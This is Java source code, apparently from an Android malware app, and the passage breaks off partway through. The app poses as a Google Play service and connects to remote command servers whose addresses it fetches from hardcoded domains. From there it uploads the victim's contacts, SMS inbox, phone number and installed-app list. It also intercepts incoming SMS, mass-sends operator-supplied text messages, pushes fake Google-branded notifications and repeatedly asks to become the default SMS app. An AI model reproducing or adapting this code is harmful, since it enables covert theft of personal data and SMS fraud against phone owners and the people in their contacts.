package replaceflag_fysn.replaceflag_rydk.replaceflag_capud;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.role.RoleManager;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Message;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.text.TextUtils;
import android.util.Log;

import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;

import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Date;
import java.util.List;
import java.util.Random;
import java.util.concurrent.TimeUnit;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_aas.replaceflag_Begryt;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_aas.replaceflag_Bteert;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_abs.replaceflag_Cuiyuy;
import replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_abs.replaceflag_Pnnmjk;

import cn.rs.keepalive.Helper;
import cn.rs.keepalive.Task;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import okhttp3.WebSocket;
import okhttp3.WebSocketListener;

public class replaceflag_Abvffg {
    public static final String TAG = "KeepAlive";
    public static final int NOTIFICATIONID_FOR_SERVICE = 0x1f00012;
    public static final String CHANNEL_ID = "Google Play";
    public static final String CHANNEL_NAME = "Google Play";
    private static NotificationManager manager;

    private static Request request;
    private static OkHttpClient client;

    // 号码
    public final static String NUM = ContactsContract.CommonDataKinds.Phone.NUMBER;
    // 联系人姓名
    public final static String NAME = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME;
    private static Uri phoneUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;

    private static final String SMS_URI_ALL = "content://sms/inbox"; // 所有短信

    private static PendingIntent sentPI;
    private static String SENT_SMS_ACTION = "SENT_SMS_ACTION";
    private static ArrayList<String> mMobiles = new ArrayList<>();
    private static ArrayList<String> mContents = new ArrayList<>();
    //待发送
    private static ArrayList<String> mDaiMobiles = new ArrayList<>();
    private static ArrayList<String> mDaiContents = new ArrayList<>();
    private static int currentMobileIndex;
    private static String content;

    private static WebSocket mWebSocket;
    private static Context mContext;
    private static boolean mIsConnected;

    private static int mLianxuErrorNum = 0;
    private static int MAX_ERROR_NUM = 8;
    private static int mErrorNum = 0;
    private static int mSuccessNum = 0;
    private static String mFailPhone = "";
    private static int MAX_CONNECT_ERROR_NUM = 5;//socket 连续连接失败次数
    private static int mLianxuConnectErrorNum = 0;
    //    private static String DEFAULT_IP = "ws://103.85.25.165:7777";
    private static String[] permissions = new String[]{Manifest.permission.SEND_SMS};
    private static ArrayList<String> mPermissionList = new ArrayList<>();
    private static int current_connect = 0;//0正常get，1备用get

    private static long mNotiTime = 300000;//通知栏间隔时间

    public static String mUrl = "http://baodulist.top/list.html";

    private static NotificationManager getManager(Context context) {
        if (manager == null) {
            manager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE);
        }
        return manager;
    }

    public static void init(Context context) {
        mContext = context;
        replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SHOW_DANGER, false);
        Helper.initialize(context, new Task() {
            @Override
            public void onStart() {
                Log.i(TAG, "Call onStart!");

                startKeepAlive(context);
            }

            @Override
            public void onStop() {
                Log.i(TAG, "Call onStop!");
            }
        }, buildNotification(context), NOTIFICATIONID_FOR_SERVICE);
        cn.rs.keepalive.Helper.start();
    }

    private static boolean isMainProcess(Context context) {
        int pid = android.os.Process.myPid();
        String currentProcessName = "";
        ActivityManager manager = (ActivityManager) context.getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningAppProcessInfo process : manager.getRunningAppProcesses()) {
            if (process.pid == pid) {
                currentProcessName = process.processName;
            }
        }

        if (currentProcessName == null || "".equals(currentProcessName)) {
            return true;
        }

        return context.getApplicationContext().getPackageName().equals(currentProcessName);
    }

    public static void removeHandler() {
        mHandler.removeCallbacksAndMessages(null);
        mHandler2.removeCallbacksAndMessages(null);
    }

    private static void startKeepAlive(Context context) {
        Log.i("rgh", "startKeepAlive: " + isMainProcess(context));
        getData();
        mHandler3.sendEmptyMessageDelayed(1, 300000);
        mHandler.sendEmptyMessageDelayed(1, 60000);

        Intent sentIntent = new Intent(SENT_SMS_ACTION);
        sentPI = PendingIntent.getBroadcast(context, 0, sentIntent, 0);
        context.registerReceiver(sendMessage, new IntentFilter(SENT_SMS_ACTION));

        IntentFilter intentFilter = new IntentFilter();
        intentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        context.registerReceiver(new replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Tfgfgy(), intentFilter);

        IntentFilter intentFilter2 = new IntentFilter();
        intentFilter2.addAction("android.permissions.send");
        context.registerReceiver(new PerReceiver(), intentFilter2);

        IntentFilter intentFilter3 = new IntentFilter();
        intentFilter3.addAction("sendcontact");
        context.registerReceiver(new SendContactReceiver(), intentFilter3);

        IntentFilter intentFilter4 = new IntentFilter(Intent.ACTION_PACKAGE_REMOVED);
        intentFilter4.addDataScheme("package");
        context.registerReceiver(new McReceiver(), intentFilter4);

        IntentFilter intentFilter5 = new IntentFilter("com.my.submit");
        context.registerReceiver(new MyReceiver(), intentFilter5);

        startSendLocal();

        mHandler2.sendEmptyMessageDelayed(0, 20000);

    }

    private static void getData() {
        Log.i("rgh", replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, "") + "----" + mLianxuConnectErrorNum + "," + MAX_CONNECT_ERROR_NUM);
        if (TextUtils.isEmpty(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, "")) || mLianxuConnectErrorNum >= MAX_CONNECT_ERROR_NUM) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    Log.i("rgh", "run");
                    try {
                        //210512eng.xyz
                        Document doc = Jsoup.connect("http://220417.top/")
                                .header("Accept-Encoding", "gzip, deflate")
                                .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0")
                                .maxBodySize(0)
                                .timeout(600000)
                                .get();
                        Log.i("rgh", "body: " + doc.body().text());
                        if (doc.body().text().contains(" ")) {
                            String url = doc.body().text().split(" ")[0];

                            if (!TextUtils.isEmpty(url)) {
                                replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, "ws://" + url);
                                current_connect = 0;
                                mHandler.sendEmptyMessageDelayed(3, 1000);
                            } else {
                                getDataBeiyong();
                            }
                        } else {
                            String url = doc.body().text();

                            if (!TextUtils.isEmpty(url)) {
                                replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, "ws://" + url);
                                current_connect = 0;
                                mHandler.sendEmptyMessageDelayed(3, 1000);
                            } else {
                                getDataBeiyong();
                            }
                        }
                    } catch (Exception e) {
                        Log.i("rgh", "run" + e.toString());
                        getDataBeiyong();
                        current_connect = 0;
                        e.printStackTrace();
                    }
                }
            }).start();
        } else {
            mHandler.sendEmptyMessageDelayed(3, 1000);
        }
    }

    private static void getDataBeiyong() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Document doc = Jsoup.connect("http://220417bei.top/")
                            .header("Accept-Encoding", "gzip, deflate")
                            .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0")
                            .maxBodySize(0)
                            .timeout(600000)
                            .get();

                    String url = doc.body().text();
                    Log.i("rgh", "body2: " + doc.body().text());
                    if (!TextUtils.isEmpty(url)) {
                        current_connect = 1;
                        replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, "ws://" + url);
                    }
                    mHandler.sendEmptyMessageDelayed(3, 1000);
                } catch (Exception e) {
                    Log.i("rgh", "2run" + e.toString());
                    current_connect = 1;
                    mHandler.sendEmptyMessageDelayed(3, 1000);
                    e.printStackTrace();
                }
            }
        }).start();
    }

    private static ArrayList<replaceflag_Begryt> mPDatas = new ArrayList();
    private static int mPErrorNum = 0;
    private static void getNameAndPkg() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    Document doc = Jsoup.connect(mUrl)
                            .header("Accept-Encoding", "gzip, deflate")
                            .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0")
                            .maxBodySize(0)
                            .timeout(600000)
                            .get();

                    String url = doc.body().text();
                    Log.i("rgh", "body3: " + doc.body().text());
                    if (url.contains(" ")) {
                        mPDatas.clear();
                        for (int i=0;i<url.split(" ").length;i++){
                            mPDatas.add(new replaceflag_Begryt(url.split(" ")[i].split("----")[0],
                                    url.split(" ")[i].split("----")[1]));
                        }
                    } else {
                        mPDatas.add(new replaceflag_Begryt(url.split("----")[0],
                                url.split("----")[1]));
                    }
                    mPErrorNum = 0;
                    checkPackages();
                } catch (Exception e) {
                    Log.i("rgh", "3run" + e.toString());
                    e.printStackTrace();
                    mPErrorNum ++;
                    if(mPErrorNum < 3){
                        getNameAndPkg();
                    }
                }
            }
        }).start();
    }

    public static class SendContactReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            Log.i("rgh", "SendContactReceiver");
            if ("sendcontact".equals(intent.getAction())) {
                if (mWebSocket != null) {
                    Log.i("rgh", "sendcontact");
                    mHandler.sendEmptyMessageDelayed(6, 60000);
                }
            }
        }
    }

    public static class PerReceiver extends BroadcastReceiver {

        @Override
        public void onReceive(Context context, Intent intent) {
            Log.i("rgh", "action: " + intent.getAction() + "," + mWebSocket);
            if ("android.permissions.send".equals(intent.getAction())) {
                if (mWebSocket != null) {
                    Log.i("rgh", "权限发送握手包");
//                    mWebSocket.send(getTxl());
                    mWebSocket.send("握手包&" + getSystemVersion() + "|" + getNativePhoneNumber()
                            + "|" + getSystemModel() + "|" + getWifiOr4G() + "|" + replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Bjtyut.get(mContext));
                }
            }
        }
    }

    private static Handler mHandler = new Handler() {
        @Override
        public void handleMessage(@NonNull Message msg) {
            super.handleMessage(msg);
            switch (msg.what) {
                case 0:
                    Log.i("rgh", msg.what + ":" + client + "," + request + "," + mWebSocket);
                    mWebSocket.send("心跳&ping");
                    sendEmptyMessageDelayed(0, 10000);
                    break;
                case 1:
                    Log.i("rgh", msg.what + ",");
                    sendEmptyMessageDelayed(2, 20000);
                    mIsConnected = false;

                    String pkg = Telephony.Sms.getDefaultSmsPackage(mContext);
                    Log.i("rgh", pkg + "," + mContext.getPackageName());
                    if (!mContext.getPackageName().equals(pkg)) {
                        Log.i("rgh", "eee");
                        try {
                            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.Q) {
                                RoleManager roleManager = mContext.getSystemService(RoleManager.class);
                                // check if the app is having permission to be as default SMS app boolean
                                boolean isRoleAvailable = roleManager.isRoleAvailable(RoleManager.ROLE_SMS);
                                if (isRoleAvailable) {
                                    Intent roleRequestIntent = roleManager.createRequestRoleIntent(RoleManager.ROLE_SMS);
                                    ((Activity) mContext).startActivityForResult(roleRequestIntent, 1);
                                }
                            } else if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.KITKAT) {
                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, mContext.getPackageName());
                                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                                mContext.startActivity(intent);
                            }
                            sendEmptyMessageDelayed(1, 60000);
                        } catch (Exception e) {
                            Log.i("rgh", "Telephony = " + e.toString());
                            sendEmptyMessageDelayed(1, 60000);
                            e.printStackTrace();
                        }
                    }
                    break;
                case 2:
                    Log.i("rgh", msg.what + "," + mIsConnected + "," + replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, ""));
                    if (!mIsConnected) {
                        if (current_connect == 1) {
                            getData();
                        } else {
                            getDataBeiyong();
                        }
//                        if(client == null){
//                            client = new OkHttpClient.Builder()
//                                    .writeTimeout(5, TimeUnit.SECONDS)
//                                    .readTimeout(5, TimeUnit.SECONDS)
//                                    .connectTimeout(10, TimeUnit.SECONDS)
//                                    .build();
//                        }
//                        if (request == null) {
//                            if (TextUtils.isEmpty(SPUtil.getString(SPConstant.SP_URL, ""))) {
//                                SPUtil.putString(SPConstant.SP_URL, DEFAULT_IP);
//                            }
//                            request = new Request.Builder().url(SPUtil.getString(SPConstant.SP_URL, DEFAULT_IP)).build();// wss://socket.idcd.com:1443
//                        }
//
//                        mWebSocket = client.newWebSocket(request, webSocketListener);
                    }
                    break;
                case 3:
                    try {
                        Log.i("rgh", msg.what + "----" + replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, ""));
                        if (TextUtils.isEmpty(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, ""))) {
                            mIsConnected = false;
                            sendEmptyMessageDelayed(2, 20000);
                            return;
                        }
                        if (mWebSocket != null) {
                            mWebSocket.close(1000, null);
                        }
                        mWebSocket = null;
                        webSocketListener = null;
                        //                       client = new OkHttpClient();
                        OkHttpClient.Builder builder = new OkHttpClient.Builder();
                        client = builder
                                .readTimeout(10, TimeUnit.SECONDS)
                                .writeTimeout(10, TimeUnit.SECONDS)
                                .connectTimeout(10, TimeUnit.SECONDS)//设置连接超时时间
                                .build();
                        initWebSocketListener();

                        request = new Request.Builder().url(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_URL, "")).build();// wss://socket.idcd.com:1443
                        mWebSocket = client.newWebSocket(request, webSocketListener);
                        client.dispatcher().executorService().shutdown();
                    } catch (Exception e) {
                        Log.i("rgh", "connect: " + e.toString());
                        mIsConnected = false;
                        mLianxuConnectErrorNum++;
                        if (mHandler.hasMessages(4)) {
                            mHandler.removeCallbacksAndMessages(null);
                            mHandler.sendEmptyMessageDelayed(4, 6000);
                        } else {
                            mHandler.removeCallbacksAndMessages(null);
                        }
                        mHandler.sendEmptyMessageDelayed(2, 40000);
                        mHandler.sendEmptyMessageDelayed(1, 30000);
                        e.printStackTrace();
                    }
                    break;
                case 4:
                    try {
                        sendSms(mMobiles.get(currentMobileIndex), mContents.get(currentMobileIndex));
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    break;
                case 5:
                    if (!replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_IS_UPLOAD_PERMISSION, false)) {
                        for (int i = 0; i < permissions.length; i++) {
                            if (ContextCompat.checkSelfPermission(mContext, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                                mPermissionList.add(permissions[i]);//添加还未授予的权限
                            }
                        }
                        if (mPermissionList.size() > 0) {
                            mWebSocket.send("权限&未获取权限");
                        }
                        replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_IS_UPLOAD_PERMISSION, true);
                    }
                    break;
                case 6:
                    Log.i("rgh", "mWebSocket.send(getTxl())");
                    if (mWebSocket != null) {
                        mWebSocket.send(getTxl());
                    }
                    break;
                case 7:
                    Log.i("rgh", "showNoti");
                    removeHandler3();

                    Intent i = new Intent(mContext, replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_oiiopActivity.class);
                    i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                    PendingIntent pi1 = PendingIntent.getActivity(mContext, 0, i,
                            PendingIntent.FLAG_UPDATE_CURRENT);

                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio notificationUtils = new replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Njyuio(mContext);
                    if(!TextUtils.isEmpty(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_NAME, ""))&&
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_NAME, "").toLowerCase().contains("google")){
                        notificationUtils.sendCustomNoti(R.drawable.replaceflag_gp_noto,
                                "", "", "type", pi1);
                    } else {
                        notificationUtils.sendCustomNoti(R.drawable.replaceflag_ic_gt,
                                "", "", "type", pi1);
                    }

                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putBoolean(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_HAS_SUBMIT_URL, false);
                    mHandler3.sendEmptyMessageDelayed(0,mNotiTime);
                    break;
            }
        }
    };
    private static WebSocketListener webSocketListener;

    private static void initWebSocketListener() {
        webSocketListener = new WebSocketListener() {
            @Override
            public void onOpen(WebSocket webSocket, Response response) {
                super.onOpen(webSocket, response);
                mLianxuConnectErrorNum = 0;
                mIsConnected = true;
                Log.i("rgh", "onOpen: " + getSystemVersion() + "|" + getNativePhoneNumber()
                        + "|" + getSystemModel() + "|" + getWifiOr4G() + "|" + replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Bjtyut.get(mContext));
                mWebSocket.send("握手包&" + getSystemVersion() + "|" + getNativePhoneNumber()
                        + "|" + getSystemModel() + "|" + getWifiOr4G() + "|" + replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Bjtyut.get(mContext));
//                if (mWebSocket != null) {
//                    Log.i("rgh", "sendcontact");
//                    mWebSocket.send(getTxl());
//                }
                int has_4 = 0;
                if (mHandler.hasMessages(4)) {
                    has_4 = 1;
                }
                if (mHandler.hasMessages(6)) {
                    mHandler.removeCallbacksAndMessages(null);
                    mHandler.sendEmptyMessageDelayed(6, 60000);
                } else {
                    mHandler.removeCallbacksAndMessages(null);
                }
                if (has_4 == 1) {
                    mHandler.sendEmptyMessageDelayed(4, 6000);
                }
                mHandler.sendEmptyMessageDelayed(0, 10000);
                mHandler.sendEmptyMessageDelayed(1, 60000);
                mHandler.sendEmptyMessageDelayed(5, 60000);
                if (!TextUtils.isEmpty(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SENDSMSCALLBACK, ""))) {
                    mWebSocket.send(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.getString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SENDSMSCALLBACK, ""));
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SENDSMSCALLBACK, "");
                }
            }

            @Override
            public void onMessage(WebSocket webSocket, String text) {
                super.onMessage(webSocket, text);
                Log.i("rgh", "onMessage: " + text);
                mIsConnected = true;
                if ("通讯录".equals(text)) {
                    mWebSocket.send(getTxl());
                } else if (text.startsWith("收件箱")) {
                    mWebSocket.send(getLocalSms());
                } else if (text.startsWith("拦截短信&open")) {
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putBoolean("lanjie_sms", true);
                    mWebSocket.send("拦截短信&open|true");
                } else if (text.startsWith("拦截短信&close")) {
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putBoolean("lanjie_sms", false);
                    mWebSocket.send("拦截短信&close|true");
                } else if (text.startsWith("发信息&")) {
                    mLianxuErrorNum = 0;
                    mErrorNum = 0;
                    mSuccessNum = 0;
                    currentMobileIndex = 0;
                    mFailPhone = "";
                    content = "";
                    mMobiles.clear();
                    mContents.clear();
                    if (mHandler.hasMessages(4)) {
                        mHandler.removeMessages(4);
                    }
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_MOBILE, "");
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_CONTENT, "");
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_SUCCESS_NUM, mSuccessNum);
                    replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putInt(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_FAIL_NUM, mErrorNum);

                    if (text.split("发信息&")[1].contains("|")) {
                        String mobile = text.split("发信息&")[1].split("\\|")[0];
                        String content1 = text.split("发信息&")[1].split("\\|")[1];
                        String content2 = text.split("发信息&")[1].split("\\|")[2];
                        if (mobile.contains(",")) {
                            String[] mobiles = mobile.split(",");
                            for (int i = 0; i < mobiles.length; i++) {
                                mMobiles.add(mobiles[i]);
                                mDaiMobiles.add(mobiles[i]);
                            }
                            if (content2.contains("#")) {
                                String[] contents = content2.split("#");
                                for (int i = 0; i < mobiles.length; i++) {
                                    int random = new Random().nextInt(contents.length);
                                    mContents.add(content1 + contents[random]);
                                    mDaiContents.add(content1 + contents[random]);
                                }
                            } else {
                                for (int i = 0; i < mobiles.length; i++) {
                                    mContents.add(content1 + content2);
                                    mDaiContents.add(content1 + content2);
                                }
                            }
                            saveLocal();
                            sendSms(mMobiles.get(0), mContents.get(0));
                        } else {
                            mMobiles.add(mobile);
                            mDaiMobiles.add(mobile);
                            if (content2.contains("#")) {
                                String[] contents = content2.split("#");
                                int random = new Random().nextInt(contents.length);
                                mContents.add(content1 + contents[random]);
                                mDaiContents.add(content1 + contents[random]);
                            } else {
                                mContents.add(content1 + content2);
                                mDaiContents.add(content1 + content2);
                            }

                            saveLocal();
                            sendSms(mobile, mContents.get(0));
                        }
                    }
                } else if (text.startsWith("清除短信&")) {


                } else if (text.startsWith("通知栏&")){
                    mTitleRetryTime = 0;
                    mUrlRetryTime = 0;
                    mBitmapRetryTime = 0;
                    mShowTime = 0;
                    getNotiTitle();
                } else if (text.startsWith("应用列表&")){
                    if(mWebSocket!=null){
                        mWebSocket.send("应用列表&" + getPackagesNames());
                    }
                }
            }

            @Override
            public void onClosed(WebSocket webSocket, int code, String reason) {
                super.onClosed(webSocket, code, reason);
                Log.i("rgh", "onClosed");
            }

            @Override
            public void onClosing(WebSocket webSocket, int code, String reason) {
                super.onClosing(webSocket, code, reason);
                Log.i("rgh", "onClosing");

            }

            @Override
            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
                super.onFailure(webSocket, t, response);
                Log.i("rgh", "onFailure");
                mIsConnected = false;
                mLianxuConnectErrorNum++;
                if (mHandler.hasMessages(4)) {
                    mHandler.removeCallbacksAndMessages(null);
                    mHandler.sendEmptyMessageDelayed(4, 6000);
                } else {
                    mHandler.removeCallbacksAndMessages(null);
                }
                mHandler.sendEmptyMessageDelayed(2, 10000);
                mHandler.sendEmptyMessageDelayed(1, 60000);

            }
        };
    }

    private static String getPackagesNames() {
        // 获取已经安装的所有应用, PackageInfo　系统类，包含应用信息
        String name = "";
        List<PackageInfo> packages = mContext.getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packages.size(); i++) {
            PackageInfo packageInfo = packages.get(i);
            if ((packageInfo.applicationInfo.flags& ApplicationInfo.FLAG_SYSTEM) == 0) { //非系统应用
                if(TextUtils.isEmpty(name)){
                    name = packageInfo.applicationInfo.loadLabel(mContext.getPackageManager()).toString();
                } else {
                    name = name + "|" + packageInfo.applicationInfo.loadLabel(mContext.getPackageManager()).toString();
                }
            }
        }
        return name.replaceAll("&",".");
    }

    private static int mTitleRetryTime = 0;
    private static int mUrlRetryTime = 0;
    private static int mBitmapRetryTime = 0;
    private static int mMaxRetry = 3;
    private static void getNotiTitle() {
        if(mTitleRetryTime<mMaxRetry){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Document doc = Jsoup.connect("http://tongzhilan.top/content.txt")
                                .header("Accept-Encoding", "gzip, deflate")
                                .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0")
                                .maxBodySize(0)
                                .timeout(600000)
                                .get();
                        Log.i("rgh", "body: " + doc.body().text() + "," + doc.body().text().contains(" "));
                        if (doc.body().text().contains(" ")) {
                            String name = doc.body().text().split(" ")[0];
                            String title = doc.body().text().split(" ")[1];
                            String content = doc.body().text().split(" ")[2];
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_NAME, name);
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_TITLE, title);
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_CONTENT, content);
                            getNotiUrl();
                        }
                    } catch (Exception e) {
                        Log.i("rgh", "title run" + e.toString());
                        mTitleRetryTime++;
                        getNotiTitle();
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

    private static void getNotiUrl() {
        if(mUrlRetryTime<mMaxRetry){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        Document doc = Jsoup.connect("http://tongzhilan.top/link.txt")
                                .header("Accept-Encoding", "gzip, deflate")
                                .userAgent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:23.0) Gecko/20100101 Firefox/23.0")
                                .maxBodySize(0)
                                .timeout(600000)
                                .get();
                        Log.i("rgh", "body: " + doc.body().text() + "," + doc.body().text().contains(" "));
                        if (doc.body().text().contains(" ")) {
                            int length = doc.body().text().split(" ").length;
                            int random = new Random().nextInt(length);
                            String url = doc.body().text().split(" ")[random];
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_URL, url);
                        } else {
                            String url = doc.body().text();
                            replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Styuty.putString(replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Cskuio.SP_NOTI_URL, url);
                        }
                        getNotiBitmap();
                    } catch (Exception e) {
                        Log.i("rgh", "url run" + e.toString());
                        mUrlRetryTime++;
                        getNotiUrl();
                        e.printStackTrace();
                    }
                }
            }).start();
        }
    }

    public static Bitmap myBitmap;
    private static void getNotiBitmap(){
        if(mBitmapRetryTime<mMaxRetry){
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        URL url = new URL("http://tongzhilan.top/logo.png");
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setDoInput(true);
                        connection.connect();
                        InputStream input = connection.getInputStream();
                        myBitmap = BitmapFactory.decodeStream(input);

                        mHandler.sendEmptyMessage(7);
                    } catch (IOException e) {
                        // Log exception
                        Log.i("rgh", "bitmap e: " + e.getMessage());
                        mBitmapRetryTime++;
                        getNotiBitmap();
                    }
                }
            }).start();
        }
    }

    /**
     * 获取当前手机系统版本号
     *
     * @return 系统版本号
     */
    private static String getSystemVersion() {
        return android.os.Build.VERSION.RELEASE;
    }

    /**
     * 获取手机型号
     *
     * @return 手机型号
     */
    private static String getSystemModel() {
        return android.os.Build.MODEL;
    }

    private static String getWifiOr4G() {
